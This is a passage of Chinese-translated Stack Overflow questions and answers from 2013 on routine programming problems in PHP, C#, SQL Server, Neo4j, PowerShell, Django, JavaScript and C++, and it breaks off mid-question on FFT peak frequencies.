是的，使用[Elastic Beanstalk 配置文件](http://aws.amazon.com/about-aws/whats-new/2012/10/02/introducing-aws-elastic-beanstalk-configuration-files/)。

# php - 导出多个json文件

> ID：15357267
> 
> 赞同：0
> 
> 时间：2013-03-12T09:16:09.693
> 
> 标签：php, mysql, json, foreach

我正在将 wordpress 与 nextgen 画廊一起使用，我想从单独的 JSON 文件中的特定画廊 id 获取图像。到目前为止，我有这个代码，但这只是从给定的 ID 导出图像（在本例中为 7）。我知道一定有某种 foreach 函数，但我的 javascript 知识不会走那么远。

有人可以帮我解决这个问题吗？我到目前为止的代码：

```
mysql_connect("localhost","DB-NAME","DB-PASSWORD");
mysql_select_db("DB-NAME");

$result=mysql_query("SELECT filename FROM zs_ngg_pictures WHERE galleryid = '7' ORDER BY sortorder LIMIT 3");

while($row=mysql_fetch_assoc($result)){
$output[]=$row;
}

$fp = fopen('result.json', 'w');
fwrite($fp, json_encode($output));
fclose($fp);

echo json_encode($output); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T12:41:47.860

如果我正确理解您要实现的目标，您可以简单地获取所有图片，将它们放入多维数组中：

```
$result=mysql_query("SELECT filename, galleryid FROM zs_ngg_pictures ORDER BY sortorder");

while($row=mysql_fetch_assoc($result)){
  $output[$row['galleryid']][] = $row['filename'];
} 
```

你有一个这样的 PHP 数组（如果你有两个 id 为 7 和 23 的画廊）：

```
array(
  7 => array('file7-1.jpg','file7-2.jpg','file7-3.jpg'),
  23 => array('file23-1.jpg','file23-2.jpg'),
); 
```

所以`result.json`文件会是这样的：

```
{ "7"  : ["file7-1.jpg", "file7-2.jpg", "file7-3.jpg"],
  "23" : ["file23-1.jpg", "file23-2.jpg"] } 
```

* * *

如果您想要为每个单独的文件，`galleryid`您可以循环并保存具有不同名称的文件：

```
foreach($output as $gall_id => $gallery) {
  file_put_contents('result-'.$gall_id.'.json', json_encode($gallery));
} 
```

你将有两个文件命名`result-7.json`为`result-23.json`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T13:18:27.713

而不是做复杂的`fopen()`事情和`echo`：

```
$fp = fopen('result.json', 'w');
fwrite($fp, json_encode($output));
fclose($fp);

echo json_encode($output); 
```

你可以简单地调用：

```
file_put_contents('result.json', json_encode($output));
readfile('result.json'); 
```

或者您跳过文件并简单地输出 JSON：

```
echo json_encode($output)); 
```

# c# - sql助手类的混淆

> ID：15357268
> 
> 赞同：0
> 
> 时间：2013-03-12T09:16:24.120
> 
> 标签：c#, datatable, sqlhelper

我想显示存储在我的数据库中的在托儿所学习的学生的姓名列表和滚动编号......但是下面的代码似乎有一个错误，我无法弄清楚

```
 protected void NurseryButton_Click(object sender, EventArgs e)
{

    SQLHelper sqhlpr = new SQLHelper();
    sqhlpr.SqlText = "Select StudentName,RollNo from tblStudentInfo where Class=@Class";
    sqhlpr.AddParameter("Class", sender.ToString());
    sqhlpr.ExecuteScalar(false);
    DataTable dt = sqhlpr.getDataTable(false);
    Label1.Text = dt.Rows[0]["StudentName"].ToString();
} 
```

在我的最后一行文本中，即 label1.text 中，错误是这样的“位置 0 处没有行”。有谁能够帮助我？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:19:15.137

您必须使用 SqlHelper.ExecuteDataSet 来获取查询的结果集。ExecuteScalar 从行中返回单个值。例子

```
DataTable dt = SqlHelper.ExecuteDataSet(ConnString,
                                 CommandType.Text,
                                 "Select StudentName,RollNo from tblStudentInfo where Class=@Class",
                                 parameter).Tables[0]; 
```

# wordpress - 使用 tinymce 链接到类别

> ID：15357269
> 
> 赞同：6
> 
> 时间：2013-03-12T09:16:25.670
> 
> 标签：wordpress, tinymce

我经常使用tinymce“链接到现有内容”按钮来链接到帖子，但想知道列表中是否也可以显示类别？

我们需要相当多地链接到类别，手动操作有点痛苦。

有谁知道这是否可能？

谢谢，

詹姆士

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-10-16T16:22:40.340

我认为此功能没有内置行为。它必须是自定义编码的。

# c# - 继承实体类的属性到另一个

> ID：15357273
> 
> 赞同：0
> 
> 时间：2013-03-12T09:16:39.093
> 
> 标签：c#

我有员工实体

```
public class Employee
{
    public Employee();

    public int BossId { get; }
    public int BossUserId { get; }
    public string CostCentre { get; }
    public int CostCentreId { get; }
    public string Department { get; }
    public int DepartmentId { get; }
    public string Designation { get; }
    public int DesignationId { get; }
    public string EmailAddress { get; }
    public int EmployeeId { get; }
    public string FirstName { get; }
    public string FullName { get; }
    public string LastName { get; }
    public string LoginId { get; }
    public int UserId { get; }

    public override string ToString();
} 
```

我想在另一个实体中使用所有这些属性并为它们分配值。

我的另一个实体是

```
public class UserRoles
{
    public UserRoles()
    {
    }

    public int UserRoleId { get; set; }
    public long EmpUserId { get; set; }
    public int RoleId { get; set; }
    public DateTime AddedOn { get; set; }
    public long AddedBy { get; set; }
    public long ModifiedBy { get; set; }
    public DateTime ModifiedOnd { get; set; }
  } 
```

如果我创建 Employee 类的属性，我无法为其赋值。而且我不能像在某些 dll 中那样更改 Employee 类。

有什么办法可以覆盖它或继承并为这些属性赋值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:34:04.300

您可以用您自己的 EmployeeWrapper 类封装 Employee 类，并在 EmployeeWrapper 中放置使用反射来设置 Employee 类属性的逻辑，如[没有 Getter/Setter 的反射中所述？](https://stackoverflow.com/questions/12478047/reflection-without-a-getter-setter).

然后你使用你的 EmployeeWrapper 并通过它的构造函数传递参数，或者只是设置它的属性，在后面它使用反射来设置实际 Employee 实例的属性。

# javascript - Yeoman yo webapp 因 TypeError 而失败

> ID：15357274
> 
> 赞同：6
> 
> 时间：2013-03-12T09:16:42.947
> 
> 标签：javascript, yeoman

升级到 nodejs 0.10.0 和 npm 1.2.14 后，如果我尝试创建 webapp，yeoman 1.0 beta 会失败：

```
$ yo webapp

path.js:360
        throw new TypeError('Arguments to path.join must be strings');
              ^
TypeError: Arguments to path.join must be strings
    at path.js:360:15
    at Array.filter (native)
    at Object.exports.join (path.js:358:36)
    at Object.<anonymous> (/opt/nodejs/node-v0.10.0-linux-x64/lib/node_modules/yo/node_modules/yeoman-generator/node_modules/bower/lib/core/config.js:41:22)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17)
    at require (module.js:380:17) 
```

节点安装在`/opt/nodejs/node-v0.10.0-linux-x64`. `NODE_PATH`环境变量指向该路径：

```
$ echo $NODE_PATH 
/opt/nodejs/node-v0.10.0-linux-x64 
```

甚至`yo init`失败并出现相同的错误。

有什么建议吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T18:44:44.903

这是 Bower 中的一个错误，并且已经修复。您可以手动更新凉亭安装或等待更新的生成器。[这是](https://github.com/yeoman/generator/commit/c8188b4cb3c63db6298394328dfffda4dada247f)解决问题的提交。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T21:49:09.650

FWIW，当我使用节点 0.8.16 运行它时，我能够让这一切消失。使用 0.10.0 导致它失败。

# c# - 为邮件和 ftp 实现 Importer

> ID：15357278
> 
> 赞同：0
> 
> 时间：2013-03-12T09:17:02.913
> 
> 标签：c#, java, php, import, dataimporthandler

实际上我有邮件导入器，它以指定的时间间隔轮询服务器。但我发现其中有一个问题。问题是我们需要在 URL 方案中以纯文本形式指定用户名和密码，所以这里的问题是它是不安全的。所以我希望任何人都可以向我建议一些可以消除这种不安全感的方法。

# sql - t-SQL 复合语句导致死锁，知道为什么吗？

> ID：15357279
> 
> 赞同：1
> 
> 时间：2013-03-12T09:17:03.257
> 
> 标签：sql, sql-server, sql-server-2008, deadlock, database-deadlocks

我正在学习更复杂的 SQL Server 2008 技术，所以如果我问了一个太明显的问题，我提前道歉。

我有这样创建的下表：

```
CREATE TABLE [dbo].[t_Log_2] 
(
   [id] INT NOT NULL IDENTITY(1,1) PRIMARY KEY, 
   [oid] INT, 
   [idtm] DATETIME2, 
   [odtm] DATETIME2, 
   [type] TINYINT, 
   [state] TINYINT, 
   [huid] UNIQUEIDENTIFIER, 
   [cnm] NVARCHAR(256), 
   [cmdl] NVARCHAR(256), 
   [batt] TINYINT, 
   [dvtp0] SMALLINT, 
   [dvtp1] SMALLINT
);

CREATE INDEX idx_idt 
          ON [dbo].[t_Log_2]([idtm]);

CREATE INDEX idx_odt 
          ON [dbo].[t_Log_2]([odtm]);

CREATE INDEX idx_huid 
          ON [dbo].[t_Log_2]([huid]);

CREATE INDEX idx_cnm 
          ON [dbo].[t_Log_2]([cnm]); 
```

然后可以从 ASP.NET Web 应用程序的**多个同时线程运行以下查询。**请注意，整个查询需要以**原子**方式运行：

```
SET XACT_ABORT ON;
BEGIN TRANSACTION;

DELETE FROM [dbo].[t_Log_2] 
      WHERE [idtm]<'2011-03-12 08:41:57';

WITH ctx AS(
     SELECT MIN([idtm]) AS mdIn, 
            MAX([odtm]) AS mdOut 
           FROM [dbo].[t_Log_2] 
          WHERE [type] = 0 
            AND [state] = 0 
            AND [huid] = N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4' 
            AND [odtm] >= '2013-03-11 06:33:32' 
            AND [idtm] <= '2013-03-11 06:43:12' 
           ) 
INSERT INTO [dbo].[t_Log_2] 
([oid],[idtm],[odtm],[type],[state],[huid],
 [cnm],[cmdl],[batt],[dvtp0],[dvtp1]) 
SELECT 
    2, 
    CASE WHEN mdIn IS NOT NULL 
          AND mdIn < '2013-03-11 06:33:32' 
         THEN mdIn 
         ELSE '2013-03-11 06:33:32' 
         END,
    CASE WHEN mdOut IS NOT NULL 
          AND mdOut > '2013-03-11 06:43:12' 
         THEN mdOut 
         ELSE '2013-03-11 06:43:12' 
         END,
    0,
    0,
    N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4',
    null,
    null,
    0,
    1,
    null 
FROM ctx 

SELECT ROWCOUNT_BIG()

DELETE FROM [dbo].[t_Log_2] 
      WHERE [type] = 0 
        AND [state] = 0 
        AND [huid] = N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4' 
        AND [odtm] >= '2013-03-11 06:33:32' 
        AND [idtm] <= '2013-03-11 06:43:12' 
        AND [id] <> SCOPE_IDENTITY()

DELETE FROM [dbo].[t_Log_2] 
      WHERE [type] = 0 
        AND [huid] = N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4' 
        AND [idtm] >= (SELECT [idtm] FROM [dbo].[t_Log_2] 
                                    WHERE [id] = SCOPE_IDENTITY()) 
        AND [odtm] <= (SELECT [odtm] FROM [dbo].[t_Log_2] 
                                    WHERE [id] = SCOPE_IDENTITY()) 
        AND [id] <> SCOPE_IDENTITY() 

;WITH ctx1 AS( 
     SELECT [idtm] AS dI 
       FROM [dbo].[t_Log_2] 
      WHERE [id] = SCOPE_IDENTITY() 
             )
UPDATE [dbo].[t_Log_2] 
        SET [odtm] = ctx1.dI 
       FROM ctx1 
      WHERE [id] <> SCOPE_IDENTITY() 
        AND [type] = 0 
        AND [huid] = N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4' 
        AND [idtm] < ctx1.dI 
        AND [odtm] > ctx1.dI 

;WITH ctx2 AS(
     SELECT [odtm] AS dO 
       FROM [dbo].[t_Log_2] 
      WHERE [id] = SCOPE_IDENTITY() 
             ) 
UPDATE [dbo].[t_Log_2] 
        SET [idtm] = ctx2.dO 
       FROM ctx2 
      WHERE [id] <> SCOPE_IDENTITY() 
        AND [type] = 0 
        AND [huid] = N'18ef4d56-6ef3-906a-a711-88d1bd6ab2d4' 
        AND [idtm] < ctx2.dO 
        AND [odtm] > ctx2.dO 

COMMIT TRANSACTION;
SET XACT_ABORT OFF 
```

请注意，上面的查询是从动态组合它的 C# 代码中一对一复制的。实际上，它的参数不是如上所示的硬编码。

此查询在大多数情况下都有效，但有时我会在日志中收到以下错误：

> 事务（进程 ID 80）与另一个进程在锁资源上死锁，并被选为死锁牺牲品。重新运行事务。

知道我该怎么做才能防止这种僵局吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:22:44.710

您需要持有更多或更少的锁。

最简单的答案是选择`NOLOCK`（最佳性能）或`TABLOCKX`（无需考虑的一致性）。

如果`with (nolock)`因为一致性要求不能使用，可以添加`with (tablockx)`. 这实际上意味着一次只有一个线程可以执行类似的语句——不会有并发。

另一种方法是更详细地分析您的需求，如果不了解更新表的原因、数据的用途等，就无法做到这一点。

例如，这个语句真的需要在事务中吗？闻起来像家务：

```
 DELETE FROM [dbo].[t_Log_2] 
  WHERE [idtm]<'2011-03-12 08:41:57'; 
```

如果您将其从事务中取出，并将其放在单独的批次中，您可能会发现问题消失了。

# neo4j - 在属性上优化 Neo4j Cypher 查询匹配

> ID：15357280
> 
> 赞同：0
> 
> 时间：2013-03-12T09:17:06.543
> 
> 标签：neo4j, cypher

我有一个 Cypher 查询，它的性能极差（约 30 秒）：

```
START foo=node:foos('Name:*')
MATCH foo<-[:HasMember]-()<-[:PartOf]-()<-[:Connected]-bar
WHERE foo.Name IN ["name1", "name2"] AND bar.Enabled = true
RETURN DISTINCT bar.Guid AS Guid, foo.Name AS Name 
```

我认为正在发生的事情是 Lucene 索引用于提取所有值，然后使用图形搜索来匹配集合中的名称，因为如果我将查询更改为下面的查询，则速度会快几个数量级（16 毫秒）：

```
START foo=node:foos('Name:"name1" OR Name:"name2"')
MATCH foo<-[:HasMember]-()<-[:PartOf]-()<-[:Connected]-bar
WHERE bar.Enabled = true
RETURN DISTINCT bar.Guid AS Guid, foo.Name AS Name 
```

有没有办法让第一个查询与第二个查询一样快地执行，而无需从名称集中手动构建一个 Lucene 查询？

另一种选择是使用遍历，但如果可能的话，我更喜欢留在 Cypher-land。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:36:34.117

也许如果您不想构建查询，请尝试更早进行过滤？像

```
START foo=node:foos('Name:*')
WHERE foo.Name IN ["name1", "name2"]
WITH foo
MATCH foo<-[:HasMember]-()<-[:PartOf]-()<-[:Connected]-bar
WHERE bar.Enabled = true
RETURN DISTINCT bar.Guid AS Guid, foo.Name AS Name 
```

# powershell - ad goup list.txt 通过管道传输到 Get-ADGroupMember

> ID：15357282
> 
> 赞同：1
> 
> 时间：2013-03-12T09:17:07.937
> 
> 标签：powershell, powershell-2.0

嗨，我是 powershell 的新手。我有带有广告组列表的文本文件，我想列出每个组的所有用户。我试过点线：

```
Get-Content '.\test list.txt' | % { Get-ADGroupMember -Recursive $_ } | select name 
```

但结果我得到所有用户列表属于文本文件中所有组的单列。

如何在列标题中获取包含所有组名的 csv 表，以及每个组名下方的用户列表？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:23:56.550

试试这个（未测试）：

```
Get-Content '.\test list.txt' | 
SELECT @{N="Group Name";e={$_}},@{N="Members";`
E={ (Get-ADGroupMember -Recursive $_) -JOIN ';' }} | fl 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T01:24:32.290

希望这对您有所帮助。它需要PS3.0：

```
Get-Content .\list.txt | % {(Get-ADGroupMember -Identity $_ -Recursive).Name | Out-File -FilePath "$_.txt"}

$hash = @{}
Get-Content .\list.txt | % {$hash["$_"] = (Get-ADGroupMember -Identity $_ -Recursive).Name}
$hash 
```

我不太使用 CSV，但我敢打赌哈希很容易格式化为 CSV 文件。

# c# - 如何更改清单 dll 版本？

> ID：15357288
> 
> 赞同：0
> 
> 时间：2013-03-12T09:17:32.383
> 
> 标签：c#, dll, version, manifest

我有一个使用实体框架版本 4.4.0.0 的应用程序，但我想使用一个新的。为此，我添加了对新 dll 的引用，设置为真正的本地副本，然后尝试运行我的应用程序。

但是，我收到一条错误消息，指出清单无法加载版本 4.4.0.0。

如何使用新版本的 dll？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:22:20.547

检查您的项目属性，您可能使用的是 .Net 4.0。为了使用 EF5，您的项目需要更新到 .Net 4.5，使用 nuget 降级/升级 EF。

# c# - 控制器上的“CA2000 在失去范围之前处理对象”

> ID：15357290
> 
> 赞同：1
> 
> 时间：2013-03-12T09:17:38.867
> 
> 标签：c#, asp.net-mvc-4, code-analysis

我在代码分析中有 CA2000 警告。但我不知道如何解决它或为什么它是一个问题。这是失败的代码：

```
 IController controller = new ErrorController();
      controller.Execute(new RequestContext(new HttpContextWrapper(Context), routeData)); 
```

我试图像这样解决它：

```
using (IController controller = new ErrorController())
      {
        controller.Execute(new RequestContext(new HttpContextWrapper(Context), routeData));
      } 
```

但是 MVC 给了我这个错误：

```
55  'System.Web.Mvc.IController': type used in a using statement must be implicitly convertible to 'System.IDisposable' 
```

我可以抑制错误，但我想知道导致错误的原因并解决问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:23:26.147

我不使用该界面，而是将其换成`var`：

```
using (var controller = new ErrorController())
      {
        controller.Execute(new RequestContext(new HttpContextWrapper(Context), routeData));
      } 
```

这将允许将类型推断为`ErrorController`.

`IDisposable`接口附加到类`Controller`。但不存在更高的链条。 [这是`Controller`](http://msdn.microsoft.com/en-us/library/system.web.mvc.controller%28v=vs.108%29.aspx). 所以，为了处理，你需要在实现的类上调用它`IDisposable`。因此，`IController` [不会工作](http://msdn.microsoft.com/en-us/library/system.web.mvc.icontroller%28v=vs.108%29.aspx)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T09:24:45.293

您的`using`声明将 the 向上转换`ErrorController`为 a `IController`，这可能没有实现`IDisposable`（而除了 之外`ErrorController` *还*实现了）。更改为：`IDisposable``IController`

```
using (var controller = new ErrorController()) 
```

或者：

```
using (ErrorController controller = new ErrorController()) 
```

# django - 如何在每张图片的评分模板计数中显示？

> ID：15357291
> 
> 赞同：1
> 
> 时间：2013-03-12T09:17:42.293
> 
> 标签：django

```
class Picture(models.Model):
    title = models.CharField(max_length=255)

class PictureRate(models.Model):
    user = models.ForeignKey(User)
    picture = models.ForeignKey(Picture)
    rate = models.DecimalField(max_digits=2,decimal_places=1) 
```

意见：

```
def index(request):
    pictures = Picture.objects.all()
    return render_to_response('index.html',{'pictures':pictures}, context_instance=RequestContext(request)) 
```

在模板中：

```
{% for p in pictures %}
    {{ p.title }}
{% endfor %} 
```

如何在模板计数中显示`rate`每个评级（）`Picture`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:25:44.607

要获得你这样做的对象外键关系，请通过它的`_set`.

```
{{ p.picturerate_set.rate }} #to access it's field.
{{ p.picturerate_set.count }} #to count the number of rates your picture has. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:14:38.563

您应该使用注释：

```
from django.db.models import Count
pictures = Picture.objects.all().annotate(rating_count=Count('picturerate')) 
```

并在模板中：

```
{{ p.rating_count }} 
```

# sql - 如何在sql表中查找错误值

> ID：15357292
> 
> 赞同：1
> 
> 时间：2013-03-12T09:17:44.620
> 
> 标签：sql, sql-server, sql-server-2008

我正在将一个表中的值插入到另一个表中。表中有 100000 条记录。但是当我开始将值从一个表插入到另一个表时，我的数据中的任何行都有问题。我不知道那具体在哪里。那么我怎么知道哪一行的值是错误的，因为插入语句没有完成呢？错误后，此停止在表中插入任何内容。这是我使用的简单语句：

```
INSERT INTO Person (FirstName, LastName,Email)
SELECT FirstName, LastName, Email
FROM Person.Contact 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:38:39.097

如果没有关于对目标表施加的约束的任何附加信息，一个非常普遍、缓慢的解决方案将是

1.  在选定行上的游标循环
2.  [在try/catch](http://msdn.microsoft.com/de-de/library/ms175976%28v=sql.100%29.aspx)中插入任何行
3.  关于异常输出行和错误消息

对于您的问题的具体答案，请提供更多信息。

另一种方法是使用 SSIS：在这里您可以为错误行提供单独的通道。这个通道可以导致一个单独的表收集所有导致错误的行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:20:14.480

问题很难理解，但通常的嫌疑人是：

1.  尝试将 Null 插入不可为空的列

2.  外键违规

3.  约束违规。

4.  试图插入错误的数据类型。

请编辑您的问题以添加错误消息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:20:52.370

我猜`Person`是您的架构的名称，所以也许您的意思是

```
INSERT INTO Person.Person (FirstName, LastName,Email)
SELECT FirstName, LastName, Email
FROM   Person.Contact 
```

# javascript - 使用 JavaScript 在另一个窗口中打开 XML 内容

> ID：15357295
> 
> 赞同：3
> 
> 时间：2013-03-12T09:17:54.917
> 
> 标签：javascript, jquery, html, xml, dom

我了解由于安全限制，我无法将 XML 内容保存到本地文件。但是有没有办法可以在另一个浏览器窗口中显示 XML 内容，如

```
Window.Open(xmlString, . .. ); 
```

这将与 -

```
Window.Open(URL, . . .); 
```

*   我不能使用服务器端语言。
*   我可以使用 javaScript\jQuery。（我已经使用它们来创建 XML）
*   我可以在我的 HTML 附近有一个模板 XML 文件。有没有办法显示模板文件并更改其内容？与 window.open几乎相同[：是否可以打开一个新窗口并修改其 DOM](https://stackoverflow.com/questions/12192239/window-open-is-it-possible-open-a-new-window-with-modify-its-dom)或[如何将 JavaScript 写入单独的窗口？](https://stackoverflow.com/questions/2696680/how-to-write-javascript-to-a-separate-window)但我需要更改 XML 节点，而不是 HTML。

编辑 1：尝试使用 myXmlWindow.document.write(xmlString)

=> 我尝试了建议的代码 -

```
 var xmlString = xml2Str(xmlDocument);
    myXmlWindow = window.open();
    myXmlWindow.document.write(xmlString);
    myXmlWindow.focus(); 
```

但它不显示整个 XML 内容，只显示实习节点值。并且新窗口仍然显示“正在连接...”，因为它没有完成加载内容（缺少关闭标签？？？）

也许我需要告诉它是 XML 内容而不是 HTML ???

我的 xmlString ：

```
<root><device1>Name</device1><device2/><device3><Temprature_1>23.5</Temprature_1><Temprature_2>23.4</Temprature_2><Temprature_3>23.4</Temprature_3><Temprature_4>23.3</Temprature_4><Temprature_5>23.2</Temprature_5></device3></root> 
```

显示的内容：

```
Name23.523.423.423.323.2 
```

编辑 2：我的代码 -

```
function xml2Str(xmlNode) {
   try {
      // Gecko- and Webkit-based browsers (Firefox, Chrome), Opera.
      return (new XMLSerializer()).serializeToString(xmlNode);
  }
  catch (e) {
     try {
        // Internet Explorer.
        return xmlNode.xml;
     }
     catch (e) {
        //Other browsers without XML Serializer
        // alert('Xmlserializer not supported');
        return('Xmlserializer not supported');
     }
   }
   return false;
}

    function fShow_xml_in_win() {

        var xmlDocument = $.parseXML("<root/>");
        var dev1 = xmlDocument.createElement('device1');
        var dev2 = xmlDocument.createElement('device2');
        var dev3 = xmlDocument.createElement('device3');
        dev1.appendChild(xmlDocument.createTextNode('Name'));
        xmlDocument.documentElement.appendChild(dev1);
        xmlDocument.documentElement.appendChild(dev2);
        xmlDocument.documentElement.appendChild(dev3);

            var i;
            var xNode;
            for (i = 0; i < 5; i++) {
              xNode = xmlDocument.createElement('Temprature_' + (i+1));
              xNode.appendChild(xmlDocument.createTextNode( "myVal " + ((i+1) * 10) ));
              dev3.appendChild(xNode);
            }

        var xmlString = xml2Str(xmlDocument);

        alert(xmlString);

        xmlString = "<?xml version='1.0' ?>" + xmlString;  // I do not know how to add this node using parseXML :(
        alert(xmlString);

        myXmlWindow = window.open();
        myXmlWindow.document.write(xmlString);
        myXmlWindow.document.close();  // !! EDIT 3
        myXmlWindow.focus();

            return false;
    } 
```

编辑 3：解决了“连接...”问题

我只需要添加 myXmlWindow.document.close();

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:36:30.737

您可以打开一个空白窗口，然后将内容写入其中，如下所示：

```
myWindow=window.open('','','width=200,height=100')
myWindow.document.write(xmlString);
myWindow.focus() 
```

您可能需要做一些工作来格式化您的 xmlString，但我认为这种方法可以满足您的需求。如果您的 xmlString 已格式化，请尝试添加：

```
<?xml version="1.0" ?> 
```

到你的字符串的开头。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:40:51.347

从你的帖子我的理解是

1.（从你的第一点开始）你从某个不是你控制的地方获得 xml。我的建议是你为什么不得到 JSON？

2.（从您的第二点开始）如果这些XML是您创建的，您为什么不尝试从参考中编写这些XML？例如：

```
 var reference = window.open();
 reference.document.write(<some string goes here>) 
```

3.（根据您的第三点）根据您的第二点的理解。您可以创建 xml。那你为什么在写完文件后改变呢？

注意：一般 XML 用于服务器到服务器的通信，JSON 用于服务器到客户端（浏览器）的通信。

# c++ - 将派生类转换为具有相同公共函数的泛型类类型，同时仍然能够调用派生类的函数

> ID：15357316
> 
> 赞同：0
> 
> 时间：2013-03-12T09:19:06.710
> 
> 标签：c++, class, inheritance, casting

在以后的程序中，我有一个类 animal，它派生了 cat 和 dog 具有相同的公共函数但不同的私有函数。我想让用户在运行时决定创建哪种动物。我做了一个简单的例子，展示了我大致想要的东西，但显然不起作用。我不知道如何解决这个问题，希望得到你的帮助。

```
#include <cstdio>

class canimal
{
  public:
    int sound()
    {
      std::printf("...\n");
      return 0;
    }
};

class cdog : public canimal
{
  public:
    int sound()
    {
      std::printf("Woof!\n");
      return 0;
    }
};

class ccat : public canimal
{
  public:
    int sound()
    {
      std::printf("Mieau!\n");
      return 0;
    }
};

int main()
{
  canimal *animal;
  cdog    *dog;

  // I would like to let the user decide here which animal will be made
  // In this case, I would like the function to say "Woof!", but of course it doesn't...
  animal = new cdog;
  animal->sound();

  // Here it works, but I would like the pointer to be of the generic class
  // such that the type of animal can be chosen at runtime
  dog    = new cdog;
  dog->sound();

  return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:21:51.910

您需要制作`sound()`方法`virtual`：

```
class canimal
{
  public:
    virtual int sound()
    ^^^^^^^ 
```

这将使它完全按照您的需要运行。

如需进一步讨论，请参阅[为什么我们需要 C++ 中的虚拟函数？](https://stackoverflow.com/questions/2391679/can-someone-explain-c-virtual-methods)

在 C++ 11 中有一个新`override`关键字，如果使用得当，可以减少某些类型的错误。请参阅[安全覆盖 C++ 虚函数](https://stackoverflow.com/questions/497630/safely-override-c-virtual-functions)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:23:09.373

你需要使用`virtual`

IE

```
class canimal
{
  public:
    virtual int sound()
    {
      std::printf("...\n");
      return 0;
    }
};

class cdog : public canimal
{
  public:
    virtual int sound()
    {
      std::printf("Woof!\n");
      return 0;
    }
};

class ccat : public canimal
{
  public:
    virtual int sound()
    {
      std::printf("Mieau!\n");
      return 0;
    }
}; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:22:10.500

我认为您正在寻求使 sound() 虚拟化。阅读 C++ 中的多态性。

```
class canimal
{
  public:
    virtual int sound()
    {
      std::printf("...\n");
      return 0;
    }
}; 
```

# c# - 在 Windows 窗体中使用 C# 在编辑模式下使用 MSHTML WebBrowser 时如何检测文档更改？

> ID：15357319
> 
> 赞同：0
> 
> 时间：2013-03-12T09:19:16.233
> 
> 标签：c#, .net, webbrowser-control, axwebbrowser

我在 WinForms 应用程序中使用 .NET WebBrowser 控件来实现一个非常基本的电子邮件模板编辑器。

我已通过以下代码将其设置为编辑模式：

```
wbEmailText.Navigate( "about:blank" );
( (HTMLDocument)wbEmailText.Document.DomDocument ).designMode = "On"; 
```

因此用户可以修改 WebBrowser 的内容。现在我需要检测用户何时修改内容，因为我必须对其进行验证。我曾尝试使用一些 WebBrowser 的事件，如 DocumentCompleted、Navigated 等，但没有一个有效。有人可以给我建议吗？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T09:59:58.803

我确实有一些工作的，真正的世界代码，但那个项目大约有 5 年的历史，我已经离开了公司。我已经搜索了我的备份但找不到它，所以我试图从内存中工作并给你一些指示。

您可以捕获许多事件，然后挂钩以了解是否已进行更改。可在此处找到事件列表：http: [//msdn.microsoft.com/en-us/library/ms535862 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/ms535862%28v=vs.85%29.aspx)

我们所做的是捕捉关键事件（他们正在打字）和点击事件（他们已经移动焦点或拖放等）并处理它。

一些示例代码，注意一些是伪代码，因为我不记得实际代码。

```
// Pseudo code
private string _content = string.empty;

private void frmMain_Load(object sender, EventArgs e)
{
    // This tells the browser that any javascript requests that call "window.external..." to use this form, useful if you want to hook up events so the browser can notify us of things via JavaScript
    webBrowser1.ObjectForScripting = this;
    webBrowser1.Url = new Uri("yourUrlHere");
}

private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
{
    // Store original content
    _content = webBrowser1.Content; // Pseudo code
    webBrowser1.Document.Click += new HtmlElementEventHandler(Document_Click);
    webBrowser1.Document.PreviewKeyDown +=new PreviewKeyDownEventHandler(Document_PreviewKeyDown);
}

protected void Document_Click(object sender, EventArgs e)
{
    DocumentChanged();
}

protected void Document_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
{
    DocumentChanged();
}

private void DocumentChanged()
{
    // Compare old content with new content
    if (_content == webBrowser1.Content)    // Pseudo code
    {
        // No changes made...
        return;
    }

    // Add code to handle the change
    // ...

    // Store current content so can compare on next event etc
    _content = webBrowser1.Content; // Pseudo code
} 
```

# java - 找到音频信号中的峰值频率？

> ID：15357323
> 
> 赞同：0
> 
> 时间：2013-03-12T09:19:17.957
> 
> 标签：java, android

我一直在尝试找到一个导致峰值频率的 DFT（或 FFT）的简单实现。但是，我见过的大多数实现都会输出一个复数数组。如何将这些 radix-2 结果转换为具体频率？

例如，我的输入数据是正弦波函数的 16 个样本，该函数在 500 - 2000Hz 之间振荡，如下所示：

```
int n = 16;    
double[] input = { 1250, 1537, 1780, 1943, 2000, 1943, 1780, 1537,
